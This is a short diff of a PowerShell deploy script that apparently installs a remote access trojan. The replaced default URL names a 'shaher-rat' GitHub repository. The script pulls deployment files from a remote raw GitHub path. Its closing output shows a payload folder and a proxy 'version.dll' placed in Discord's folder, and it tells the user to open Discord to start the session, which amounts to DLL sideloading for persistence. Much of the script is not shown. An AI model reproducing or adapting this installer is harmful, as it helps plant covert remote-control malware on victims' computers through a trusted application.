@@ -2,7 +2,7 @@
 # Edit GitHubBaseUrl below OR pass: deploy.ps1 -GitHubBaseUrl "https://raw.githubusercontent.com/user/repo/main/deploy"
 
 param(
-    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy"
+    [string]$GitHubBaseUrl = "https://raw.githubusercontent.com/YOUR_USER/YOUR_REPO/main/deploy"
 )
 
 $ErrorActionPreference = "Stop"
@@ -92,4 +92,5 @@ Write-Host "  Payload : $payloadRoot" -ForegroundColor White
 Write-Host "  Proxy   : $discordFolder\version.dll" -ForegroundColor White
 Write-Host ""
 Write-Host "Open Discord to start the session." -ForegroundColor Yellow
+
 
